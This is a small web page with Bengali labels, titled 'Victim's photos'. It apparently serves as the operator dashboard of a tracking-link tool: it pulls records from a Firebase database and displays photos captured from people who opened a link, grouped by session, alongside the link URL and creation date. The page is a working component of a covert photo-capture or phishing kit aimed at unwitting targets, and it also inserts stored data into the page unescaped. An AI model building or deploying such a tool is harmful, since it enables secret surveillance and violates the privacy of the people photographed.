<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিকটিমের ছবি</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body{background:#111;color:#fff;font-family:'Segoe UI',sans-serif;padding:15px;min-height:100vh;}
    h1{text-align:center;color:#00ccff;font-size:2em;margin:20px 0;}
    .info{background:#222;padding:15px;border-radius:14px;margin:15px 0;text-align:center;}
    .session{background:#1a1a2e;border-radius:18px;padding:20px;margin:25px 0;}
    .date{color:#00ff9d;font-size:1.5em;font-weight:700;margin-bottom:8px;}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;}
    .grid img{width:100%;height:200px;object-fit:cover;border-radius:14px;border:4px solid #0066ff;cursor:pointer;}
  </style>
</head>
<body>
<h1>ভিকটিমের ছবি</h1>
<div class="info" id="info">লোড হচ্ছে...</div>
<div id="sessions"></div>

<script>
const firebaseConfig = { /* তোমার কনফিগ */ };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let id = new URLSearchParams(location.search).get('id');
if (!id) id = location.pathname.slice(1);

db.ref('links/' + id).on('value', snap => {
  const data = snap.val();
  if (!data) {
    document.getElementById("info").innerHTML = "কোনো ডাটা নেই!";
    return;
  }

  document.getElementById("info").innerHTML = `লিংক: ${data.url}<br>তৈরি: ${data.created}`;

  const sessions = data.sessions || {};
  let html = '';
  Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
    const s = sessions[date];
    html += `<div class="session"><div class="date">${date}</div>
      <div class="grid">${(s.photos || []).map(src => `<img src="${src}" onclick="window.open('${src}')">`).join('')}</div>
    </div>`;
  });

  document.getElementById("sessions").innerHTML = html || "<p style='text-align:center;color:#888;padding:50px;'>ছবি আসেনি</p>";
});
</script>
</body>
</html>
